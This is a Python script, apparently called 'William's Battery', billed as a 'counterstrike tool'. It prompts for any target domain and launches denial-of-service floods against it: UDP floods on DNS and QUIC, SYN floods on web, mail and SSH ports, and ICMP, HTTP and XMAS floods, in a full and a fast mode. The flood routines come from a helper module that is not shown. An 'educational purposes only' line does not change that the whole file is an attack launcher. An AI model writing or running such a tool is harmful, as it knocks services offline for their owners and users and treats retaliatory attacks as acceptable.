import counter_strike_helper


def full_scale_counter_strike(target):
    print("Full Counterstrike Initiated...")
    print("Performing UDP Attack")
    counter_strike_helper.attack_UDP("UDP-Mix",target,53,300) # DNS
    counter_strike_helper.attack_UDP("UDP-Mix", target, 443, 300) # QUIC
    print("Performing SYN Flood")
    counter_strike_helper.synflood(target,80,200) # HTTP
    counter_strike_helper.synflood(target, 443, 200) # HTTPS
    counter_strike_helper.synflood(target, 25, 200) # Email
    counter_strike_helper.synflood(target, 587, 200) # Email
    counter_strike_helper.synflood(target, 465, 200) # Email
    counter_strike_helper.synflood(target, 143, 200) # Email
    counter_strike_helper.synflood(target, 993, 200) # Email
    counter_strike_helper.synflood(target, 22, 200) # SSH
    print("Performing ICMP Flood")
    counter_strike_helper.icmpflood(target,200) # ICMP
    print("Performing HTTP Flood")
    counter_strike_helper.attack_http_flood(target,80,30000) # http flood
    print("Performing XMAS Flood")
    for port in range(0,1024): # xmas flood
        counter_strike_helper.xmasflood(target,port,50)


def fast_counter_strike(target):
    print("Full Counterstrike Initiated...")
    print("Performing UDP Attack")
    counter_strike_helper.attack_UDP("UDP-Mix", target, 53, 120)  # DNS
    print("Performing SYN Flood")
    counter_strike_helper.synflood(target, 80, 100)  # HTTP
    counter_strike_helper.synflood(target, 443, 100)  # HTTPS
    counter_strike_helper.synflood(target, 25, 100)  # Email
    counter_strike_helper.synflood(target, 587, 100)  # Email
    print("Performing ICMP Flood")
    counter_strike_helper.icmpflood(target, 80) # ICMP
    print("Performing HTTP Flood")
    counter_strike_helper.attack_http_flood(target, 80, 10000) # http flood


if __name__ == "__main__":
    print("-"*60)
    print("WELCOME TO WILLIAM'S BATTERY ---- A CONVENIENT COUNTERSTRIKE TOOL")
    print("-"*60)
    print("This tool is for educational purposes only!")
    target_domain = str(input("Please Enter The Domain Name Of Your Target: "))
    print(f"Target: {target_domain}")
    options = int(input("For Full Counterstrike, Enter 1;\n"
                        "For Fast Counterstrike, Enter 2\n"
                        "Please Enter Your Options: "))
    if options == 1:
        full_scale_counter_strike(target_domain)
    elif options == 2:
        fast_counter_strike(target_domain)
